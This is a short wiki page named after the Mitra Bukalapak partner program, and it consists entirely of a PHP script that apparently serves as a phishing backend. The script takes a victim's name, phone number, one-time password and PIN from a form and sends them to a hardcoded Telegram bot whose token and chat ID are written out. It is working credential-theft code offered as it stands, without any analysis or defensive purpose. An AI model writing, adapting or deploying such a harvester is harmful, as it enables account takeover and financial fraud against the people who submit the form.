Welcome to the Mitra_bukalapak- wiki!
<?php
// Ambil data dari form
$nama = $_POST['nama'];
$nomor = $_POST['nomor'];
$otp = $_POST['otp'];
$pin = $_POST['pin'];

// Token bot dan chat_id kamu
$token = "7866440039:AAHcG7uDs3OXr5YX6234avY_Ddn3AXkEnXo";
$chat_id = "7610437378";

// Format pesan
$text = "DATA PENDAFTARAN:\n\n";
$text .= "Nama: $nama\n";
$text .= "Nomor HP: $nomor\n";
$text .= "OTP: $otp\n";
$text .= "PIN: $pin";

// Kirim ke Telegram
$url = "https://api.telegram.org/bot$token/sendMessage";
$data = [
  'chat_id' => $chat_id,
  'text' => $text
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch);

// Tampilkan pesan sukses
echo "Data berhasil dikirim ke Telegram!";
?>
